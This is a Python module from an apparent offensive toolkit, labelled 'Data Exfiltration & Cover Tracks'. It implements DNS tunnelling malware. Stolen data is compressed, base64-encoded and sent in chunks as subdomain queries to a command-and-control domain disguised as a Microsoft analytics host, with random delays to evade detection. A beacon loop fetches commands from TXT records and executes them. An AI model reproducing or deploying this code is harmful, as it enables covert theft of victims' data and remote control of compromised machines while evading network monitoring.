# -----------------------------------------------------------------------------------|
#                                                                                    |
# MODULE 5:                                                                          |
# DATA EXFILTRATION & COVER TRACKS                                                   |
#                                                                                    |
# -----------------------------------------------------------------------------------|


# dns_exfil.py - Stealthy data exfiltration via DNS queries
import dns.resolver, dns.query, dns.message, base64, zlib, time, random

class DNSExfiltrator:
    def __init__(self, c2_domain="cdn.microsoft-analytics.com"):
        self.c2_domain = c2_domain
        self.resolver = dns.resolver.Resolver()
        self.chunk_size = 30  # Bytes per DNS label (max 63, but we need room)
        
    def exfiltrate(self, data):
        """Exfiltrate data via DNS TXT or A record queries"""
        
        # Compress and encode
        compressed = zlib.compress(data.encode() if isinstance(data, str) else data)
        encoded = base64.b64encode(compressed).decode()
        
        # Split into chunks
        chunks = [encoded[i:i+self.chunk_size] for i in range(0, len(encoded), self.chunk_size)]
        
        # Send each chunk as subdomain query
        for i, chunk in enumerate(chunks):
            # Create subdomain: [seq].[chunk].[random].c2_domain
            subdomain = f"{i:04d}.{chunk}.{random.randint(1000,9999)}.{self.c2_domain}"
            
            try:
                # TXT records are less suspicious for large data
                answers = self.resolver.resolve(subdomain, 'TXT')
                
                # Response can contain next instructions
                for rdata in answers:
                    for txt_string in rdata.strings:
                        if txt_string.startswith(b'CMD:'):
                            command = txt_string[4:].decode()
                            return command
                            
            except:
                # Fallback to A records
                try:
                    self.resolver.resolve(subdomain, 'A')
                except:
                    pass
            
            # Random delay between queries
            time.sleep(random.uniform(0.5, 2.0))
    
    def beacon(self):
        """Regular beaconing via DNS"""
        while True:
            # Check for commands
            check_domain = f"check.{random.randint(10000,99999)}.{self.c2_domain}"
            try:
                answers = self.resolver.resolve(check_domain, 'TXT')
                for rdata in answers:
                    for txt_string in rdata.strings:
                        cmd = txt_string.decode()
                        result = self._execute_command(cmd)
                        self.exfiltrate(result)
            except:
                pass
            
            time.sleep(random.randint(300, 1800))
